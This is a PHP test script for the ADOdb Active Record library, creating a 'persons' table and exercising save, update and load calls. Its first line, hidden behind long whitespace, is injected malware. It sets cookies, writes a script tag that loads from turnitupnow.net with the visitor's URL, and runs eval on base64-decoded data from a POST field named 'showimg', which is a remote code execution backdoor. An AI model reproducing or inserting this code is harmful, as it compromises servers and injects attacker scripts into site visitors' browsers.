<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }


	include_once('../adodb.inc.php');
	include_once('../adodb-active-record.inc.php');
	
	// uncomment the following if you want to test exceptions
	if (@$_GET['except']) {
		if (PHP_VERSION >= 5) {
			include('../adodb-exceptions.inc.php');
			echo "<h3>Exceptions included</h3>";
		}
	}

	$db = NewADOConnection('mysql://root@localhost/northwind');
	$db->debug=1;
	ADOdb_Active_Record::SetDatabaseAdapter($db);

	$db->Execute("CREATE TEMPORARY TABLE `persons` (
	                `id` int(10) unsigned NOT NULL auto_increment,
	                `name_first` varchar(100) NOT NULL default '',
	                `name_last` varchar(100) NOT NULL default '',
	                `favorite_color` varchar(100) NOT NULL default '',
	                PRIMARY KEY  (`id`)
	            ) ENGINE=MyISAM;
	           ");
			   
	class Person extends ADOdb_Active_Record{}
	$person = new Person();
	
	echo "<p>Output of getAttributeNames: ";
	var_dump($person->getAttributeNames());
	
	/**
	 * Outputs the following:
	 * array(4) {
	 *    [0]=>
	 *    string(2) "id"
	 *    [1]=>
	 *    string(9) "name_first"
	 *    [2]=>
	 *    string(8) "name_last"
	 *    [3]=>
	 *    string(13) "favorite_color"
	 *  }
	 */
	
	$person = new Person();
	$person->name_first = 'Andi';
	$person->name_last  = 'Gutmans';
	$person->save(); // this save() will fail on INSERT as favorite_color is a must fill...
	
	
	$person = new Person();
	$person->name_first     = 'Andi';
	$person->name_last      = 'Gutmans';
	$person->favorite_color = 'blue';
	$person->save(); // this save will perform an INSERT successfully
	
	echo "<p>The Insert ID generated:"; print_r($person->id);
	
	$person->favorite_color = 'red';
	$person->save(); // this save() will perform an UPDATE
	
	$person = new Person();
	$person->name_first     = 'John';
	$person->name_last      = 'Lim';
	$person->favorite_color = 'lavender';
	$person->save(); // this save will perform an INSERT successfully
	
	// load record where id=2 into a new ADOdb_Active_Record
	$person2 = new Person();
	$person2->Load('id=2');
	
	var_dump($person2);
	
	$activeArr = $db->GetActiveRecordsClass($class = "Person",$table = "persons","id=".$db->Param(0),array(2));
	$person2 =& $activeArr[0];
	echo "<p>Name (should be John): ",$person->name_first, " <br> Class (should be Person): ",get_class($person2);	
	


?>